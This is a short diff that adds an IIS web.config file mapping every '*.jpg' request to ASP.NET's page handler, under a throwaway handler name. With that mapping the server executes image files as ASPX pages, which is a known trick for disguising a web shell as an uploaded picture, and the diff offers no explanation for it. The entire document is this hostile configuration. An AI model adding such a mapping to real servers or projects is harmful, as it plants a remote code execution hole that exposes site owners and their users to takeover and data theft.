@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<configuration><system.webServer><handlers>
+  <add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
+</handlers></system.webServer></configuration>
